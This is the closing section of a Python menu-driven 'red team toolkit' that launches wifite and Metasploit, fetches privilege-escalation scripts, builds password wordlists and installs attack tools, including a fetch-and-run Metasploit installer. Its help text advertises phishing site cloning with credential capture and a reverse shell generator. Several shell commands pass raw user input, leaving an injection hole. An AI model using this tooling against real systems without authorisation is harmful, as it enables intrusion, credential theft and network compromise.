    print("4. Crack WPA/WPA2")
    print("5. Wifite (Automated)")
    
    choice = input(f"\n{Colors.WARNING}Select option: {Colors.ENDC}").strip()
    
    if choice == '1':
        if check_tool_installed('aircrack-ng'):
            print(f"\n{Colors.OKBLUE}Aircrack-ng Suite Commands:{Colors.ENDC}")
            print("  airmon-ng     - Monitor mode")
            print("  airodump-ng   - Capture packets")
            print("  aireplay-ng   - Inject packets")
            print("  aircrack-ng   - Crack WEP/WPA")
        else:
            print(f"{Colors.FAIL}[!] Aircrack-ng not installed{Colors.ENDC}")
    
    elif choice == '5':
        if check_tool_installed('wifite'):
            os.system("sudo wifite")
        else:
            print(f"{Colors.FAIL}[!] Wifite not installed{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] Install: sudo apt install -y wifite{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def privesc_checkers():
    """Privilege escalation checkers"""
    print(f"\n{Colors.HEADER}=== Privilege Escalation Checkers ==={Colors.ENDC}")
    
    print(f"\n{Colors.OKBLUE}Available checkers:{Colors.ENDC}")
    print("1. LinPEAS (Linux)")
    print("2. WinPEAS (Windows)")
    print("3. Linux Smart Enumeration (lse.sh)")
    print("4. Linux Exploit Suggester")
    print("5. Download all scripts")
    
    choice = input(f"\n{Colors.WARNING}Select option: {Colors.ENDC}").strip()
    
    scripts_dir = WORDLISTS_DIR / "privesc_scripts"
    scripts_dir.mkdir(exist_ok=True)
    
    scripts = {
        '1': ('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh'),
        '2': ('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe', 'winPEAS.exe'),
        '3': ('https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh', 'lse.sh'),
        '4': ('https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh', 'les.sh')
    }
    
    if choice in scripts:
        url, filename = scripts[choice]
        dest = scripts_dir / filename
        if download_file(url, dest):
            dest.chmod(0o755)
            print(f"{Colors.OKGREEN}[✓] Saved to: {dest}{Colors.ENDC}")
    
    elif choice == '5':
        for key, (url, filename) in scripts.items():
            dest = scripts_dir / filename
            download_file(url, dest)
            dest.chmod(0o755)
        print(f"\n{Colors.OKGREEN}[✓] All scripts downloaded to: {scripts_dir}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def launch_metasploit():
    """Launch Metasploit Framework"""
    print(f"\n{Colors.HEADER}=== Metasploit Framework ==={Colors.ENDC}")
    
    if check_tool_installed('msfconsole'):
        print(f"{Colors.WARNING}[!] Launching Metasploit...{Colors.ENDC}")
        os.system("msfconsole")
    else:
        print(f"{Colors.FAIL}[!] Metasploit not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install from: https://www.metasploit.com/{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def wordlist_generator():
    """Generate custom wordlists"""
    print(f"\n{Colors.HEADER}=== Wordlist Generator ==={Colors.ENDC}")
    
    print(f"\n{Colors.OKBLUE}Wordlist types:{Colors.ENDC}")
    print("1. Crunch (Pattern-based)")
    print("2. CeWL (Website scraper)")
    print("3. CUPP (User profile)")
    print("4. Download popular wordlists")
    
    choice = input(f"\n{Colors.WARNING}Select option: {Colors.ENDC}").strip()
    
    if choice == '1':
        if check_tool_installed('crunch'):
            min_len = input(f"{Colors.WARNING}Minimum length: {Colors.ENDC}").strip()
            max_len = input(f"{Colors.WARNING}Maximum length: {Colors.ENDC}").strip()
            charset = input(f"{Colors.WARNING}Character set (or press enter for default): {Colors.ENDC}").strip()
            
            output_file = WORDLISTS_DIR / f"crunch_{min_len}_{max_len}.txt"
            
            if charset:
                cmd = f"crunch {min_len} {max_len} {charset} -o {output_file}"
            else:
                cmd = f"crunch {min_len} {max_len} -o {output_file}"
            
            run_command(cmd, "Generating wordlist", timeout=600)
            print(f"{Colors.OKGREEN}[✓] Wordlist saved to: {output_file}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Crunch not installed{Colors.ENDC}")
    
    elif choice == '2':
        if check_tool_installed('cewl'):
            url = input(f"{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
            output_file = WORDLISTS_DIR / f"cewl_{int(time.time())}.txt"
            
            cmd = f"cewl {url} -w {output_file} -d 2 -m 5"
            run_command(cmd, "Scraping website for wordlist", timeout=300)
            print(f"{Colors.OKGREEN}[✓] Wordlist saved to: {output_file}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] CeWL not installed{Colors.ENDC}")
    
    elif choice == '3':
        if check_tool_installed('cupp'):
            os.system("cupp -i")
        else:
            print(f"{Colors.FAIL}[!] CUPP not installed{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] Install: sudo apt install -y cupp{Colors.ENDC}")
    
    elif choice == '4':
        print(f"\n{Colors.OKBLUE}Popular wordlists:{Colors.ENDC}")
        print("  /usr/share/wordlists/rockyou.txt")
        print("  /usr/share/wordlists/dirb/common.txt")
        print("  /usr/share/seclists/")
        
        install_seclists = input(f"\n{Colors.WARNING}Install SecLists? (y/n): {Colors.ENDC}").strip().lower()
        if install_seclists == 'y':
            run_command("sudo apt update && sudo apt install -y seclists", "Installing SecLists", timeout=300)
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

# ==================== TOOL INSTALLATION MODULE ====================

def installation_helper():
    """Tool installation helper"""
    print(f"\n{Colors.HEADER}=== Tool Installation Helper ==={Colors.ENDC}")
    
    tools = {
        'Phishing Tools': [
            ('httrack', 'sudo apt install -y httrack'),
            ('set', 'sudo apt install -y set'),
            ('qrencode', 'sudo apt install -y qrencode'),
        ],
        'Bug Hunting Tools': [
            ('nmap', 'sudo apt install -y nmap'),
            ('subfinder', 'GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'),
            ('amass', 'sudo apt install -y amass'),
            ('nuclei', 'GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest'),
            ('sqlmap', 'sudo apt install -y sqlmap'),
            ('ffuf', 'sudo apt install -y ffuf'),
            ('gobuster', 'sudo apt install -y gobuster'),
            ('whatweb', 'sudo apt install -y whatweb'),
            ('nikto', 'sudo apt install -y nikto'),
            ('dalfox', 'GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest'),
            ('arjun', 'pip3 install arjun'),
        ],
        'Red Team Tools': [
            ('hydra', 'sudo apt install -y hydra'),
            ('john', 'sudo apt install -y john'),
            ('hashcat', 'sudo apt install -y hashcat'),
            ('metasploit', 'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall'),
            ('aircrack-ng', 'sudo apt install -y aircrack-ng'),
            ('wifite', 'sudo apt install -y wifite'),
            ('ettercap', 'sudo apt install -y ettercap-graphical'),
            ('crunch', 'sudo apt install -y crunch'),
            ('cewl', 'sudo apt install -y cewl'),
            ('searchsploit', 'sudo apt install -y exploitdb'),
        ]
    }
    
    print(f"\n{Colors.OKBLUE}Tool Installation Status:{Colors.ENDC}\n")
    
    for category, tool_list in tools.items():
        print(f"{Colors.HEADER}{category}:{Colors.ENDC}")
        for tool, cmd in tool_list:
            installed = check_tool_installed(tool)
            status = f"{Colors.OKGREEN}✓ Installed{Colors.ENDC}" if installed else f"{Colors.FAIL}✗ Not installed{Colors.ENDC}"
            print(f"  {tool.ljust(20)} {status}")
        print()
    
    print(f"\n{Colors.OKBLUE}Options:{Colors.ENDC}")
    print("1. Install all tools")
    print("2. Install specific category")
    print("3. Install specific tool")
    print("0. Back")
    
    choice = input(f"\n{Colors.WARNING}Select option: {Colors.ENDC}").strip()
    
    if choice == '1':
        print(f"\n{Colors.WARNING}[!] This will install ALL tools. This may take a while...{Colors.ENDC}")
        confirm = input("Continue? (yes/no): ").strip().lower()
        if confirm == 'yes':
            for category, tool_list in tools.items():
                for tool, cmd in tool_list:
                    if not check_tool_installed(tool):
                        run_command(cmd, f"Installing {tool}", timeout=600)
    
    elif choice == '2':
        print(f"\n{Colors.OKBLUE}Categories:{Colors.ENDC}")
        categories = list(tools.keys())
        for i, cat in enumerate(categories, 1):
            print(f"{i}. {cat}")
        
        try:
            cat_choice = int(input(f"\n{Colors.WARNING}Select category: {Colors.ENDC}")) - 1
            category = categories[cat_choice]
            
            for tool, cmd in tools[category]:
                if not check_tool_installed(tool):
                    run_command(cmd, f"Installing {tool}", timeout=600)
        except:
            print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

# ==================== MAIN MENU ====================

def main_menu():
    """Main application menu"""
    while True:
        print(f"\n{Colors.HEADER}{'='*75}")
        print("                           MAIN MENU")
        print(f"{'='*75}{Colors.ENDC}")
        print(f"""
{Colors.FAIL}1.{Colors.ENDC} 🎣 Phishing Module
{Colors.OKGREEN}2.{Colors.ENDC} 🐛 Bug Hunting Module
{Colors.WARNING}3.{Colors.ENDC} ⚔️  Red Team Attacks Module
{Colors.OKBLUE}4.{Colors.ENDC} 🛠️  Tool Installation Helper
{Colors.OKCYAN}5.{Colors.ENDC} ℹ️  About / Help
{Colors.FAIL}0.{Colors.ENDC} 🚪 Exit
        """)
        
        choice = input(f"{Colors.WARNING}Select module: {Colors.ENDC}").strip()
        
        if choice == '1':
            phishing_menu()
        elif choice == '2':
            bug_hunting_menu()
        elif choice == '3':
            redteam_menu()
        elif choice == '4':
            installation_helper()
        elif choice == '5':
            show_help()
        elif choice == '0':
            print(f"\n{Colors.OKGREEN}[+] Thank you for using Red Team Toolkit!{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Remember: Use ethically and legally!{Colors.ENDC}\n")
            sys.exit(0)
        else:
            print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

def show_help():
    """Show help and information"""
    print(f"\n{Colors.HEADER}{'='*75}")
    print("                    ABOUT & HELP")
    print(f"{'='*75}{Colors.ENDC}")
    
    help_text = f"""
{Colors.OKBLUE}Red Team Specialized Toolkit v2.0{Colors.ENDC}

{Colors.HEADER}Purpose:{Colors.ENDC}
This toolkit is designed for educational and authorized security testing purposes.
It provides three main modules:

{Colors.FAIL}1. Phishing Module:{Colors.ENDC}
   - Clone real-time websites (HTTrack, wget)
   - Inject credential capture scripts
   - Setup phishing servers with logging
   - Generate QR codes for physical campaigns
   - Create email templates
   - Integrate with Social Engineering Toolkit (SET)

{Colors.OKGREEN}2. Bug Hunting Module:{Colors.ENDC}
   - Fully automated vulnerability scanning
   - Takes website as input, does everything automatically
   - Subdomain enumeration
   - Port scanning and service detection
   - SQL injection testing (SQLMap)
   - XSS vulnerability testing
   - Directory fuzzing
   - Technology detection
   - SSL/TLS security analysis
   - Generates comprehensive HTML reports

{Colors.WARNING}3. Red Team Attacks Module:{Colors.ENDC}
   - Password attacks (Hydra, Medusa)
   - Brute force attacks (ZIP, hash cracking)
   - Reverse shell generator (all languages)
   - Payload generator (msfvenom)
   - Exploit database search
   - Man-in-the-Middle tools
   - WiFi attacks (Aircrack-ng)
   - Privilege escalation checkers
   - Metasploit integration

{Colors.HEADER}Key Features:{Colors.ENDC}
✓ Website cloning with real-time credential capture
✓ Automated bug hunting - just provide URL
✓ All major red team attack vectors
✓ Professional HTML reports
✓ Tool installation helper
✓ Educational warnings throughout

{Colors.HEADER}Legal Notice:{Colors.ENDC}
{Colors.FAIL}⚠️  ALWAYS get written authorization before testing
⚠️  Unauthorized access is ILLEGAL
⚠️  Use only for educational purposes or authorized pentests
⚠️  You are responsible for your actions{Colors.ENDC}

{Colors.HEADER}Recommended Lab Environments:{Colors.ENDC}
• DVWA (Damn Vulnerable Web Application)
• Metasploitable 2/3
• OWASP Juice Shop
• TryHackMe
• HackTheBox

{Colors.HEADER}Support:{Colors.ENDC}
Report locations:
• Phishing: {PHISHING_DIR}
• Bug Hunting: {REPORTS_DIR}
• Wordlists: {WORDLISTS_DIR}

{Colors.OKGREEN}Made for cybersecurity education ❤️{Colors.ENDC}
    """
    
    print(help_text)
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

# ==================== MAIN EXECUTION ====================

def main():
    """Main execution function"""
    try:
        # Clear screen
        os.system('clear' if os.name != 'nt' else 'cls')
        
        # Show banner
        print_banner()
        
        # Show legal warning
        print_legal_warning()
        
        # Create necessary directories
        create_directories()
        
        # Start main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.FAIL}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[✗] Fatal error: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()
